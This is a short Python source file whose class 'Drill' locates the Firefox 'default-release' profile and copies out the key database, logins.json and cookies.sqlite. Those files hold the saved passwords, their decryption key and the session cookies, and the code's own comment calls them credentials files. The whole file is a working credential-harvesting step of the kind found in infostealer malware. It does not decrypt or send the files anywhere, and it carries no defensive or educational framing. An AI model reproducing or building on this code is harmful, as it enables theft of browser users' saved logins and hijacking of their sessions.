import os
from shutil import copyfile

class Drill:
    Path = None
    CurrentProfile = None

    Files = []

    def __init__(self, path):
        if os.path.exists(path):
            self.Path = path

    def ExtractFiles(self):
        if self.Path != None:
            # Find the folder containing the credentials files
            for folder in os.listdir(self.Path):
                if "default-release" in folder:
                    self.CurrentProfile = self.Path + f'\\{folder}'

            # Extract the paths
            for file in os.listdir(self.CurrentProfile):
                if ('key' in file and file.endswith('.db')) or file == 'logins.json' or file == 'cookies.sqlite':
                    copyfile(self.CurrentProfile + f"\\{file}", file)
                    self.Files.append(file)

            return self.Files
        else:
            return []